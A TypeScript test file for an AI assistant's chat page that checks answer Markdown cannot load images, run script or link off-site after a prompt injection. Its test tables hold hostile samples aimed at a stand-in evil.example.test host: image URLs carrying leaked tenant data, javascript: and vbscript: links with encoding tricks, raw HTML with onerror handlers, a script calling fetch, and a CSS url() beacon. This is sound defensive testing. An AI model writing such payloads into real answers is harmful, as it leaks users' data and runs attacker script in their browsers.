import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { cleanup, screen } from "@testing-library/react";

import { FakeConversationServer } from "../test/fake-conversations.ts";
import { renderAt } from "../test/render.tsx";

// The rules of an answer's Markdown (safe-markdown.ts, docs/architecture/ai-assistant.md 「安全」
// point 5), checked on the conversation page as the user gets it: through the real client, the
// assistant-ui thread and react-markdown. A model that read a prompt injection can write any of
// these into an answer; none of them may draw an image, fetch anything or link off this SPA.

const EVIL = "https://evil.example.test";

/** Every element that would make the browser fetch or run something. */
const LOADING_ELEMENTS =
  "img, picture, source, video, audio, iframe, frame, object, embed, script, link, style, svg, image, form, input, button";

let outbound: string[] = [];
let realFetch: typeof fetch;

beforeEach(() => {
  // The app's requests go through the fake servers it is given; anything that reaches the
  // global fetch is a request the page made on its own.
  outbound = [];
  realFetch = globalThis.fetch;
  globalThis.fetch = ((input: RequestInfo | URL) => {
    outbound.push(input instanceof Request ? input.url : String(input));
    return Promise.reject(new Error("no network in tests"));
  }) as typeof fetch;
});

afterEach(() => {
  globalThis.fetch = realFetch;
  cleanup();
});

/** Renders a conversation whose one answer is `markdown`, and returns the answer's element. */
async function answer(markdown: string): Promise<HTMLElement> {
  const server = new FakeConversationServer();
  const conversation = server.add({
    messages: [
      { kind: "question", text: "Show me" },
      { kind: "answer", text: markdown },
    ],
  });
  renderAt(`/conversations/${conversation.id}`, { conversations: server.api() });
  const article = await screen.findByRole("article", { name: "TrustIoT's answer" });
  // The answer's own content, without its copy button.
  const content = article.firstElementChild;
  if (!(content instanceof HTMLElement)) throw new Error("the answer has no content element");
  return content;
}

/** What the answer holds that could load or link: nothing but SPA links is allowed. */
function hazards(content: HTMLElement) {
  return {
    loading: [...content.querySelectorAll(LOADING_ELEMENTS)].map((element) => element.outerHTML),
    links: [...content.querySelectorAll("a")].map((link) => link.getAttribute("href")),
    // No element keeps an attribute from the Markdown: only the classes the components set.
    attributes: [...content.querySelectorAll("*")].flatMap((element) =>
      [...element.attributes]
        .map((attribute) => attribute.name)
        // `data-discover` is React Router's mark on its links.
        .filter((name) => !["class", "href", "start", "scope", "data-status", "data-discover"].includes(name)),
    ),
    styled: content.querySelectorAll("[style]").length,
  };
}

const clean = { loading: [], links: [], attributes: [], styled: 0 };

describe("an answer's images", () => {
  test.each([
    ["an external image", `![floor plan](${EVIL}/plan.png?leak=tenant-data)`, "[image not shown: floor plan]"],
    ["a data: image", "![chart](data:image/png;base64,iVBORw0KGgo=)", "[image not shown: chart]"],
    ["an image without words", `![](${EVIL}/pixel.gif)`, "[image not shown]"],
    ["a reference-style image", `![logo][ref]\n\n[ref]: ${EVIL}/logo.png`, "[image not shown: logo]"],
    ["a same-origin image", "![icon](/favicon.svg)", "[image not shown: icon]"],
    ["an image inside a link", `[![badge](${EVIL}/b.svg)](${EVIL})`, "[image not shown: badge]"],
  ])("%s is its words, never an image element", async (_name, markdown, words) => {
    const content = await answer(markdown);
    expect(hazards(content)).toEqual(clean);
    expect(content.textContent).toContain(words);
    expect(content.textContent).not.toContain("leak=tenant-data");
    expect(outbound).toEqual([]);
  });
});

describe("an answer's links", () => {
  test("a path of this SPA is a link, and only its path", async () => {
    const content = await answer(
      'Open [the settings](/settings "Settings") or [dashboard](/dashboards?tab=archived#top).',
    );
    const links = [...content.querySelectorAll("a")];
    expect(links.map((link) => [link.textContent, link.getAttribute("href")])).toEqual([
      ["the settings", "/settings"],
      ["dashboard", "/dashboards?tab=archived#top"],
    ]);
    // No title, target, rel or event attribute from the Markdown.
    for (const link of links) expect(link.getAttributeNames().sort()).toEqual(["class", "data-discover", "href"]);
  });

  test.each([
    ["an external link", `[the report](${EVIL}/r?d=secret)`, `the report (${EVIL}/r?d=secret)`],
    ["an autolink", `<${EVIL}/x>`, `${EVIL}/x`],
    ["a bare web address", "see www.evil.example.test/x now", "www.evil.example.test/x"],
    ["an email autolink", "<someone@evil.example.test>", "someone@evil.example.test"],
    ["javascript:", "[run](javascript:alert(1))", "run (javascript:alert(1))"],
    ["javascript: in mixed case", "[run](JaVaScRiPt:alert(1))", "run (JaVaScRiPt:alert(1))"],
    ["javascript: with an entity", "[run](java&#115;cript:alert(1))", "run (javascript:alert(1))"],
    ["javascript: with a named entity", "[run](javascript&colon;alert(1))", "run (javascript:alert(1))"],
    ["javascript: percent-encoded", "[run](java%73cript:alert(1))", "run (java%73cript:alert(1))"],
    ["javascript: after spaces", "[run](<  javascript:alert(1)>)", "run"],
    ["data:", "[open](data:text/html;base64,PHNjcmlwdD4=)", "open (data:text/html;base64,PHNjcmlwdD4=)"],
    ["vbscript:", "[open](vbscript:msgbox(1))", "open (vbscript:msgbox(1))"],
    ["a protocol-relative address", "[x](//evil.example.test/a)", "x (//evil.example.test/a)"],
    ["two backslashes", "[x](\\\\evil.example.test/a)", "x ("],
    ["a path that resolves off the origin", "[x](/.//evil.example.test/a)", "x (/.//evil.example.test/a)"],
    ["an address of this origin", "[x](https://app.example.test/settings)", "x (https://app.example.test/settings)"],
    ["a reserved path", "[x](/api/assistant/v1/conversations)", "x (/api/assistant/v1/conversations)"],
    ["the sign-in page", "[x](/login?next=/settings)", "x (/login?next=/settings)"],
    ["a reference-style link", `[the report][r]\n\n[r]: ${EVIL}/r`, `the report (${EVIL}/r)`],
    ["a relative path", "[x](settings)", "x (settings)"],
  ])("%s is plain text", async (_name, markdown, words) => {
    const content = await answer(markdown);
    expect(hazards(content)).toEqual(clean);
    expect(content.textContent).toContain(words);
    expect(outbound).toEqual([]);
  });

  test("a slash and a backslash is a path of this origin, never another host", async () => {
    // The parser percent-encodes the backslash, so the browser never reads it as `//`.
    const content = await answer("[x](/\\evil.example.test/a) [y](/%5Cevil.example.test/b)");
    const hrefs = [...content.querySelectorAll("a")].map((link) => link.getAttribute("href") ?? "");
    expect(hrefs).toEqual(["/%5Cevil.example.test/a", "/%5Cevil.example.test/b"]);
    for (const href of hrefs) expect(new URL(href, window.location.href).host).toBe("app.example.test");
    expect(outbound).toEqual([]);
  });

  test("a very long external address stays text, and a very long SPA path stays a link", async () => {
    const long = "a".repeat(8000);
    const external = await answer(`[x](${EVIL}/${long}) and [y](/dashboards?q=${long})`);
    expect(hazards(external).loading).toEqual([]);
    expect(hazards(external).links).toEqual([`/dashboards?q=${long}`]);
    expect(external.textContent).toContain(`x (${EVIL}/${long})`);
  });
});

describe("raw HTML in an answer", () => {
  test.each([
    ["an image", `<img src="${EVIL}/x.png" onerror="alert(1)">`],
    ["a link", `<a href="${EVIL}">click</a>`],
    ["a frame", `<iframe src="${EVIL}"></iframe>`],
    ["a script", "<script>fetch('https://evil.example.test')</script>"],
    ["a style", "<style>body{background:url(https://evil.example.test/x)}</style>"],
    ["an inline element", `Text <span style="color:red" onclick="alert(1)">red</span> <b>bold</b>`],
    ["an SVG", `<svg><image href="${EVIL}/x.svg"/></svg>`],
    ["a form", `<form action="${EVIL}"><input name="q"><button>go</button></form>`],
  ])("%s is shown as the text it is", async (_name, html) => {
    const content = await answer(`Before\n\n${html}\n\nAfter`);
    expect(hazards(content)).toEqual(clean);
    expect(content.textContent).toContain(html);
    expect(outbound).toEqual([]);
  });

  test("HTML inside a paragraph and a table cell is text too", async () => {
    const content = await answer(`A <img src=${EVIL}/a.png> B\n\n| a | b |\n| - | - |\n| <a href=${EVIL}>x</a> | 2 |`);
    expect(hazards(content)).toEqual(clean);
    expect(content.textContent).toContain(`<img src=${EVIL}/a.png>`);
    expect(content.textContent).toContain(`<a href=${EVIL}>x</a>`);
  });
});

describe("what an answer may have", () => {
  test("headings, lists, tables, quotes and code are drawn, with no attribute from the Markdown", async () => {
    const content = await answer(
      [
        "# Energy",
        "Floor 3 used **412 kWh**, _6%_ ~~more~~ less.",
        "3. third\n4. fourth",
        "- a\n- [x] done",
        "> quoted",
        "| Floor | kWh |\n| :- | -: |\n| 3 | 412 |",
        "```ts onload=alert(1)\nconst x = 1;\n```",
        "Inline `code`.",
        "A footnote[^1].\n\n[^1]: The note.",
      ].join("\n\n"),
    );
    expect(hazards(content)).toEqual(clean);
    // A Markdown heading sits under the page's own headings.
    expect(content.querySelector("h1, h2")).toBeNull();
    expect(content.querySelector("h3")?.textContent).toBe("Energy");
    expect(content.querySelector("strong")?.textContent).toBe("412 kWh");
    expect(content.querySelector("ol")?.getAttribute("start")).toBe("3");
    expect(content.querySelector("blockquote")?.textContent?.trim()).toBe("quoted");
    expect([...content.querySelectorAll("th, td")].map((cell) => cell.textContent)).toEqual([
      "Floor",
      "kWh",
      "3",
      "412",
    ]);
    expect(content.querySelector("td:last-child")?.className).toContain("text-right");
    expect(content.querySelector("pre code")?.className).toContain("language-ts");
    expect(content.querySelector("pre code")?.textContent).toBe("const x = 1;\n");
    // The task list's checkbox and the footnote's links are left out; their words stay.
    expect(content.textContent).toContain("done");
    expect(content.textContent).toContain("The note.");
  });

  test("character references decode without an HTML sink", async () => {
    const content = await answer("Tom &amp; Jerry &copy; &#x41; &lt;b&gt;");
    expect(content.textContent).toContain("Tom & Jerry © A <b>");
    expect(content.querySelector("b")).toBeNull();
  });
});
